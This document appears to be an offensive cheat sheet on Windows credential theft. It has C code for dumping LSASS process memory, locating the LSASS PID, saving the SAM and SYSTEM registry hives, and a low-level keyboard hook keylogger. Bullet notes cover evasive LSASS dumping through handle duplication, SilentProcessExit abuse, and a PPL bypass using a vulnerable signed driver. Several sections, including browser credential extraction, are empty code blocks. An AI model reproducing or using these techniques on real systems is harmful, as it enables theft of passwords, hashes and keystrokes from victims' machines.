# Credential Access Techniques

## LSASS Dumping - MiniDumpWriteDump
```c
#include <dbghelp.h>
#pragma comment(lib, "dbghelp.lib")
HANDLE hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsassPid);
HANDLE hFile = CreateFileA("dump.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
MiniDumpWriteDump(hProc, lsassPid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
```

## Finding LSASS PID
```c
HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
PROCESSENTRY32 pe = { sizeof(pe) };
Process32First(hSnap, &pe);
do {
    if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) { pid = pe.th32ProcessID; break; }
} while (Process32Next(hSnap, &pe));
```

## LSASS Dump via Handle Duplication
- Find existing LSASS handle in another process
- NtDuplicateObject to get handle in our process
- Avoids calling OpenProcess on LSASS directly

## LSASS Dump via RtlReportSilentProcessExit
- Configure LSASS for silent process exit monitoring via registry
- HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe
- Set ReportingMode, LocalDumpFolder, DumpType
- Call RtlReportSilentProcessExit — Windows dumps LSASS automatically

## PPL Bypass
- LSASS runs as Protected Process Light on modern Windows
- BYOVD: Load vulnerable signed driver to remove PPL flag in kernel
- Handle duplication from processes that already have LSASS access

## SAM Database Dumping

### Local (Registry)
```c
RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SAM", 0, KEY_READ, &hKey);
RegSaveKeyA(hKey, "sam.hiv", NULL);
RegSaveKeyA(hSystemKey, "system.hiv", NULL);
```

### From Disk
```c
```

### Remote (MS-SAMR)
```c
```

## Browser Credential Extraction

### Chrome (v80+)
```c
```

### Firefox
```c
```

## Keylogging
```c
HHOOK hHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKbd = (KBDLLHOOKSTRUCT*)lParam;
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}
```
